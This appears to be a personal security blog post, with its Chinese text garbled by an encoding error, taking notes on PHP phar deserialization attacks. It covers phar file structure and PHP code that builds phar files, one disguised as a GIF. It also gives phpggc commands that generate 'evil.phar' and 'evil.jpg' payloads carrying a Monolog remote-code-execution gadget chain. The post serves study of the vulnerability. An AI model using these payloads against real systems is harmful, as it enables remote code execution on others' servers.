<p>ç®€è¿°:pharè§¦å‘ååºåˆ—åŒ–æ¼æ´çš„æœºç†ä¸»è¦æ˜¯ç”±äº:pharæ–‡ä»¶ä¼šå­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-data.</p>
<h3 id="æ•æ„Ÿå‡½æ•°">æ•æ„Ÿå‡½æ•°</h3>
<ul>
<li><code>file_exists()</code></li>
<li><code>is_dir()</code></li>
</ul>
<p>æ›´å¤š:</p>
<figure data-type="image" tabindex="3"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2022_12/Untitled%201a_1.png" alt="Untitled" loading="lazy"></figure>
<h3 id="è§¦å‘å‰æ">è§¦å‘å‰æ</h3>
<ul>
<li>php.ini ä¸‹çš„ <code>phar.readonly</code> è®¾ç½®ä¸º <code>off</code></li>
</ul>
<h3 id="æ–‡ä»¶ç»“æ„">æ–‡ä»¶ç»“æ„</h3>
<p>ç”±å››éƒ¨åˆ†ç»„æˆ:</p>
<ul>
<li>stub :æ ¼å¼å›ºå®š,å¿…é¡»ä»¥ <code>xxx&lt;?php xxx; HALT_COMPILER();?&gt;</code> å¿…é¡»ä»¥ `__HALT_COMPILER();?&gt; ç»“å°¾</li>
<li>manifest: è¢«å‹ç¼©æ–‡ä»¶çš„æƒé™,å±æ€§ç­‰ä¿¡æ¯.ä»¥åºåˆ—åŒ–çš„å½¢å¼å­˜å‚¨ç”¨æˆ·è‡ªå®šä¹‰çš„meta-data</li>
<li>contents: è¢«å‹ç¼©æ–‡ä»¶çš„å†…å®¹</li>
<li>signature: ç­¾å,æ”¾æ–‡æœ«</li>
</ul>
<h3 id="ç¤ºä¾‹">ç¤ºä¾‹</h3>
<pre><code class="language-reason">&lt;?php
    class TestObject {
    }

    @unlink(&quot;phar.phar&quot;);
    $phar = new Phar(&quot;phar.phar&quot;); //åç¼€åå¿…é¡»ä¸ºphar
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stub
    $o = new TestObject();
    $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest
    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶
    //ç­¾åè‡ªåŠ¨è®¡ç®—
    $phar-&gt;stopBuffering();
?&gt;
</code></pre>
<h3 id="ä¼ªé€ å…¶ä»–æ ¼å¼æ–‡ä»¶">ä¼ªé€ å…¶ä»–æ ¼å¼æ–‡ä»¶</h3>
<p>å› ä¸ºpharæ–‡ä»¶è¢«phpè¯†åˆ«ä¸»è¦æ˜¯:</p>
<ul>
<li>æ–‡ä»¶å¤´stub</li>
<li><code>__HALT_COMPILER();?&gt;</code></li>
</ul>
<p>æ‰€ä»¥åªéœ€è¦:</p>
<ul>
<li>æ·»åŠ ä»»æ„æ–‡ä»¶å¤´</li>
<li>ä¿®æ”¹åç¼€å</li>
</ul>
<p>ç¤ºä¾‹</p>
<pre><code class="language-reason">&lt;?php
    class TestObject {
    }

    @unlink(&quot;phar.phar&quot;);
    $phar = new Phar(&quot;phar.phar&quot;);
    $phar-&gt;startBuffering();
    $phar-&gt;setStub(&quot;GIF89a&quot;.&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //è®¾ç½®stubï¼Œå¢åŠ gifæ–‡ä»¶å¤´
    $o = new TestObject();
    $phar-&gt;setMetadata($o); //å°†è‡ªå®šä¹‰meta-dataå­˜å…¥manifest
    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶
    //ç­¾åè‡ªåŠ¨è®¡ç®—
    $phar-&gt;stopBuffering();
?&gt;
</code></pre>
<p>ç¤ºä¾‹å¢åŠ äº†Gifæ–‡ä»¶å¤´ <code>GIF89a</code></p>
<figure data-type="image" tabindex="4"><img src="https://raw.githubusercontent.com/1dayluo/PicGo4Blog/main/2022_12/Untitled%202a_2.png" alt="Untitled" loading="lazy"></figure>
<p>å¦‚å›¾,ç”Ÿæˆçš„pharæ–‡ä»¶è¢«è¯†åˆ«ä¸ºgif,ä¿®æ”¹åç¼€çš„pocå¯ä»¥å‚è€ƒhackeroneçš„æŠ¥å‘Š:<a href="https://hackerone.com/reports/921288">https://hackerone.com/reports/921288</a></p>
<h3 id="phar-è‡ªåŠ¨åŒ–ç”Ÿæˆå·¥å…·">phar:// è‡ªåŠ¨åŒ–ç”Ÿæˆå·¥å…·</h3>
<p>å¯ä»¥ä½¿ç”¨phpgcc</p>
<p>å…·ä½“å‚è€ƒæ–‡ç« :<a href="https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A">https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A</a></p>
<p><strong>ç”Ÿæˆpharæ–‡ä»¶,å¹¶å°†ååºåˆ—åŒ–åˆ©ç”¨é“¾æ’å…¥</strong></p>
<pre><code class="language-bash">php phpggc -o evil.phar Monolog/RCE6 system id
</code></pre>
<p><strong>ä¼ªé€ å›¾ç‰‡æ ¼å¼</strong></p>
<p>å‚æ•° <code>-pj</code></p>
<pre><code class="language-bash">php phpggc -pj example.jpg -o evil.jpg Monolog/RCE6 system whoami
</code></pre>
<h3 id="é™åˆ¶æ¡ä»¶">é™åˆ¶æ¡ä»¶</h3>
<p>phar:// ååºåˆ—åŒ–åˆ©ç”¨,é‡åˆ°ä»¥ä¸‹å‡ ä¸ªæ¡ä»¶ä¼šå—é™:</p>
<ul>
<li>php 8.0 åŠä»¥ä¸Š</li>
<li>pharæ–‡ä»¶ä¼ªé€ å›¾ç‰‡æ ¼å¼,å¦‚æœå›¾ç‰‡ä½¿ç”¨GDåº“å¤„ç†è¿‡,åˆ™pharå†…å®¹ä¼šè¢«å¤„ç†æ‰.</li>
</ul>
<h3 id="phpè§£æpharæ‰€æ”¯æŒçš„æ–‡ä»¶æ ¼å¼">PHPè§£æpharæ‰€æ”¯æŒçš„æ–‡ä»¶æ ¼å¼</h3>
<p>ä¸€å…±æ”¯æŒä¸‰ç§:</p>
<ul>
<li>zip
<ul>
<li>æ–‡ä»¶å¤´å°¾éƒ½å¯ä»¥æœ‰è„æ•°æ®,é€šè¿‡ä¿®å¤åç§»é‡è·å¾—ä¸€ä¸ªåˆæ³•çš„zipæ–‡ä»¶(å–å†³äºzipè§£æå™¨,pharè§£æå™¨ä¼šæ£€æŸ¥æ–‡ä»¶å¤´æ ¼å¼)</li>
</ul>
</li>
<li>tar
<ul>
<li>æ§åˆ¶æ–‡ä»¶å¤´,å³å¯æ„é€ åˆæ³•çš„taræ–‡ä»¶,å³ä½¿æ–‡ä»¶å°¾æœ‰åƒåœ¾å­—ç¬¦</li>
</ul>
</li>
<li>phar
<ul>
<li>å¿…é¡»æ§åˆ¶æ–‡ä»¶å°¾ï¼Œä½†ä¸éœ€è¦æ§åˆ¶æ–‡ä»¶å¤´ã€‚PHPåœ¨è§£ææ—¶ä¼šåœ¨æ–‡ä»¶å†…æŸ¥æ‰¾<code>&lt;?php __HALT_COMPILER(); ?&gt;</code><br>
è¿™ä¸ªæ ‡ç­¾ï¼Œè¿™ä¸ªæ ‡ç­¾å‰é¢çš„å†…å®¹å¯ä»¥ä¸ºä»»æ„å€¼ï¼Œä½†åé¢çš„å†…å®¹å¿…é¡»æ˜¯pharæ ¼å¼ï¼Œå¹¶ä»¥è¯¥æ–‡ä»¶çš„sha1ç­¾åä¸å­—ç¬¦ä¸²<code>GBMB</code><br>
ç»“å°¾ã€‚</li>
</ul>
</li>
</ul>
<h3 id="ä¸åŒåœºæ™¯ä¸‹ä½¿ç”¨phar">ä¸åŒåœºæ™¯ä¸‹ä½¿ç”¨phar</h3>
<ul>
<li>ä½¿ç”¨äº†lessæ‰©å±•(å‘åå…¼å®¹çš„CSSæ‰©å±•è¯­è¨€):
<ul>
<li>åˆ©ç”¨æ–‡ç« :<a href="https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A">https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A</a></li>
</ul>
</li>
</ul>
<h2 id="reference">Reference</h2>
<p>ç¬”è®°&amp;ååºåˆ—åŒ–æ•™ç¨‹ï¼š</p>
<ul>
<li><a href="https://www.k0rz3n.com/2018/11/19/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.k0rz3n.com/2018/11/19/ä¸€ç¯‡æ–‡ç« å¸¦ä½ æ·±å…¥ç†è§£PHPååºåˆ—åŒ–æ¼æ´/</a></li>
<li><a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a></li>
<li><a href="https://www.xanhacks.xyz/p/php-gadget-chain/">https://www.xanhacks.xyz/p/php-gadget-chain/</a></li>
<li><a href="https://portswigger.net/web-security/deserialization">https://portswigger.net/web-security/deserialization</a></li>
<li><a href="https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A">https://mp.weixin.qq.com/s/EqEyEDKpzxS5BYA_t74p9A</a></li>
</ul>
<p>ä¸é”™çš„report ï¼ˆå¾…è¡¥å……æ”¶é›†ï¼‰</p>
<ul>
<li><a href="https://hackerone.com/reports/921288">https://hackerone.com/reports/921288</a></li>
</ul>

          </div>
        </div>

        
          <div class="next-post">
            <a class="purple-link" href="https://1dayluo.github.io/post/wo-hao-kun-11-yue-de-shui-wen-yi-fen/">
              <h3 class="post-title">
                ä¸‹ä¸€ç¯‡ï¼šæˆ‘å¥½å›° 11æœˆçš„æ°´æ–‡ä¸€ä»½
              </h3>
            </a>
          </div>
          
      </div>

      

      <div class="site-footer">
  <div class="slogan">ç¢æœˆæ˜Ÿè¾°æ½æ±Ÿé£ , æˆ‘å¿ƒæœ‰å‰‘é—®å¤©æ¶¯ </div>
  <div class="social-container">
    
      
    
      
    
      
    
      
    
      
    
  </div>
   | <a class="rss" href="https://1dayluo.github.io/atom.xml" target="_blank">RSS</a>
</div>


    </div>
    <script type="application/javascript">

hljs.initHighlightingOnLoad()

var app = new Vue({
  el: '#app',
  data: {
    menuVisible: false,
  },
})

</script>




  </body>
</html>
